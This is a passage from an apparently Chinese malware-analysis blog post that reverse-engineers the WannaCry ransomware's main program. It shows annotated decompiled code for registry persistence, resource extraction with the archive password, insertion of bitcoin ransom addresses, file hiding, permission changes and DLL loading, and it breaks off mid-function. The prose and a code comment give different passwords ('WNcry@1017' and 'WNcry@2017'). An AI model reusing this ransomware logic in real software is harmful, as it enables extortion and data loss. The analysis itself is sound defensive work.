taskhsvc.exe<br>的联网情况，我们看到病毒一直在对49159和9050端口进行监听，并利用端口尝试对局域网内的一些IP进行渗透。</p><h1 id="5-wncry-exe-病毒主程序分析"><a href="#5-wncry-exe-病毒主程序分析" class="headerlink" title="5 wncry.exe 病毒主程序分析"></a>5 wncry.exe 病毒主程序分析</h1><h2 id="5-1-主体逻辑"><a href="#5-1-主体逻辑" class="headerlink" title="5.1 主体逻辑"></a>5.1 主体逻辑</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  Filename <span class="token operator">=</span> byte_40F910<span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 初始化内存  </span>v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">GetModuleFileNameA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token number">0x208u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 获取当前进程的完整路径  </span><span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>RandResult<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 获取一串随机的字母+数字  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_p___argc</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span>           <span class="token comment">// 如果命令行参数个数不等于2  </span><span class="token operator">||</span> <span class="token punctuation">(</span>v5 <span class="token operator">=</span> <span class="token function">_p___argv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> aI<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_401B5F</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">CopyFileA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span>FileName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_401F5D</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>             <span class="token comment">// 查找在当前文件路径中的位置  </span><span class="token operator">*</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">SetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 切换当前的工作目录  </span><span class="token function">SetReg</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                  <span class="token comment">// 设置当前进程目录到注册表项 </span><span class="token function">ReleaseFiles</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">::</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 释放文件和语言包到工作路径下  </span><span class="token function">WriteCwnry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 重写c.wnry文件 添加比特币账户  </span><span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>CommandLine<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 隐藏当前路径下的所有文件 </span><span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>aIcaclsGrantEve<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 添加Everyone用户 授予all访问权限  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                            <span class="token comment">// 获取一些必要的API函数地址  </span><span class="token punctuation">&#123;</span>  CDatabase<span class="token operator">::</span><span class="token function">CDatabase</span><span class="token punctuation">(</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 构造函数 初始化临界区  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ImportKeyAndAllocMem</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 导入私钥并且分配两块固定内存  </span><span class="token punctuation">&#123;</span>  DecryptFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  pFile <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">DecryptFile</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> t_wnry<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DecryptFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 从t.wnry中解密出一个dll文件  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> pFile <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  pHeapBase <span class="token operator">=</span> <span class="token function">WriteAllocMem</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> DecryptFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 申请一块堆空间 并把解密出的dll写入到堆空间 pHeapBase=dll->Nt头  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> pHeapBase <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  TaskStartAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">GetExportFunAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pHeapBase<span class="token punctuation">,</span> TaskStart<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> TaskStartAddr <span class="token punctuation">)</span>  <span class="token comment">// 从堆空间中取出dll导出函数的地址 并调用 </span><span class="token function">TaskStartAddr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  CDatabase<span class="token operator">::</span><span class="token operator">~</span><span class="token function">CDatabase</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CDatabase <span class="token operator">*</span><span class="token punctuation">)</span>this<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 析构函数 释放资源  </span><span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过对主题的完整注释我们大致了解了病毒所进行的主要操作，经总结为如下过程：</p><ol><li><p> 初始化 内存，工作目录和随机数</p></li><li><p> 设置注册表项为当前进程目录</p></li><li><p> 释放资源包内的文件和语言包</p></li><li><p> 在c.wnry 内添加比特币账户</p></li><li><p> 隐藏当前路径下的文件</p></li><li><p> 进行加解密操作</p></li><li><p> 释放资源</p></li></ol><p>以上过程能完整的展现出了病毒进行的操作，但是有一些操作由于参数设置错误，实际上没有实现。接下来我将对病毒的具体行为进行分析总共分为两个部分<br>第一部分 初始化操作 第二部分 加载病毒核心操作</p><h2 id="5-2-初始化操作"><a href="#5-2-初始化操作" class="headerlink" title="5.2 初始化操作"></a>5.2 初始化操作</h2><p>初始化作为病毒文件的第一部分主要涉及几个函数<br>GetRandom获取随机数，SetReg设置注册表，ReleaseFiles<br>释放资源文件，我们将进行逐一的分析</p><h3 id="5-2-1-GetRandom-获取随机数"><a href="#5-2-1-GetRandom-获取随机数" class="headerlink" title="5.2.1 GetRandom 获取随机数"></a>5.2.1 GetRandom 获取随机数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token keyword">int</span> RandResult<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">GetComputerNameW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>nSize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 获取计算机名  </span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcslen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">)</span> <span class="token punctuation">)</span>                  <span class="token comment">// 如果计算机名的长度不为0  </span><span class="token punctuation">&#123;</span>  v2 <span class="token operator">=</span> <span class="token operator">&amp;</span>ComputerName<span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  v1 <span class="token operator">*=</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span>              <span class="token comment">// V1=[ComputerName]  即V1=计算机名的第一个字母的ASCII  </span><span class="token operator">++</span>i<span class="token punctuation">;</span>                    <span class="token comment">// 下标自增  </span><span class="token operator">++</span>v2<span class="token punctuation">;</span>                   <span class="token comment">// ComputerName++两次 即截断计算机名的第一个字母  </span>v3 <span class="token operator">=</span> <span class="token function">wcslen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ComputerName<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> v3 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>       <span class="token comment">// 循环次数i=strlen(Computer)   </span><span class="token function">srand</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// v1=计算机名所有ASCII的乘积  </span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">do</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4<span class="token operator">++</span> <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">0x61</span><span class="token punctuation">;</span><span class="token comment">// 随机取了一个字符串 假设：cecazrsga  </span><span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> v5 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v6 <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;</span> v6 <span class="token punctuation">)</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4<span class="token operator">++</span> <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xA</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">;</span><span class="token comment">// 随机取了一个数字122  </span>result <span class="token operator">=</span> RandResult<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> RandResult<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token comment">// 最后的结果等于两次随机结果拼在一起 cecazrsga122  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>病毒首先获取计算机名ASCII码的连乘，并以其作为种子利用rand()函数得到一对字母+数字的随机数作为随机字符串</p><h3 id="5-2-2-SetReg-设置注册表项"><a href="#5-2-2-SetReg-设置注册表项" class="headerlink" title="5.2.2 SetReg 设置注册表项"></a>5.2.2 SetReg 设置注册表项</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">SetReg</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">wcscat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> Source<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 字符串拼接->SoftwareWanaCrypt0r   </span>v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span>  <span class="token function">RegCreateKeyW</span><span class="token punctuation">(</span>HKEY_CURRENT_USER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>  <span class="token function">RegCreateKeyW</span><span class="token punctuation">(</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建了注册表项  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hKey <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">GetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token number">0x207u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取当前的进程所在目录  </span>v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 获取所在目录的长度  </span>v2 <span class="token operator">=</span> <span class="token function">RegSetValueExA</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> ValueName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 将当前exe所在的路径设置为注册表项的值  </span><span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>  cbData <span class="token operator">=</span> <span class="token number">519</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">RegQueryValueExA</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> ValueName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE<span class="token punctuation">)</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> v3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>  <span class="token function">SetCurrentDirectoryA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">RegCloseKey</span><span class="token punctuation">(</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token punctuation">)</span>  <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v12 <span class="token operator">>=</span> <span class="token number">2</span> <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见病毒创建了一个注册表项<br>并将当前病毒主体所在位置的决定路径设置到注册表的<br>HKEY_LOCAL_MACHINESOFTWARE 下</p><h3 id="5-2-3-ReleaseFiles-释放资源文件"><a href="#5-2-3-ReleaseFiles-释放资源文件" class="headerlink" title="5.2.3 ReleaseFiles 释放资源文件"></a>5.2.3 ReleaseFiles 释放资源文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">ReleaseFiles</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>Str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  hRsrc <span class="token operator">=</span> <span class="token function">FindResourceA</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x80A</span><span class="token punctuation">,</span> Type<span class="token punctuation">)</span><span class="token punctuation">;</span>HRSRC <span class="token operator">=</span> hRsrc<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hRsrc <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  hGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal <span class="token punctuation">)</span>                               <span class="token comment">// 将资源载入到内存并锁定  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  lpRes <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lpRes <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  ResourceSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> HRSRC<span class="token punctuation">)</span><span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token function">sub_4075AD</span><span class="token punctuation">(</span>lpRes<span class="token punctuation">,</span> ResourceSize<span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// str="WNcry@2017" 函数返回1||0  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v7 <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x128u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">SetReleasePath</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 将0x24放到内存中 v11=0x24  </span>v9 <span class="token operator">=</span> v11<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  <span class="token function">SetReleasePath</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置文件释放的路径 并保存到内存中  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">,</span> Str2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">GetFileAttributesA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token comment">// 比较b.wnry和c.wnry  </span><span class="token function">ReleaseFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Str1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 释放文件到工作目录下  </span><span class="token operator">++</span>v10<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v10 <span class="token operator">&lt;</span> v9 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">FreeMemory</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment">// 做内存释放等扫尾工作  </span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数的主要作用就是将资源包中的文件，利用解压密码”WNcry@1017”进行解压到当前进程的路径下，方便下面的操作进一步利用压缩包中的文件。</p><h3 id="5-2-4-WriteCwnry-重写c-wnry"><a href="#5-2-4-WriteCwnry-重写c-wnry" class="headerlink" title="5.2.4 WriteCwnry 重写c.wnry"></a>5.2.4 WriteCwnry 重写c.wnry</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">WriteCwnry</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>  Source <span class="token operator">=</span> a13am4vw2dhxygx<span class="token punctuation">;</span>                  <span class="token comment">// 13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94</span>v5 <span class="token operator">=</span> a12t9ydpgwuez9n<span class="token punctuation">;</span>                      <span class="token comment">// 12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw  </span>v6 <span class="token operator">=</span> a115p7ummngoj1p<span class="token punctuation">;</span>                      <span class="token comment">// 115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn  </span>result <span class="token operator">=</span> <span class="token function">ReadOrWriteFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DstBuf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 读取c.wnry到内存中   </span><span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>  v1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">[</span>v1 <span class="token 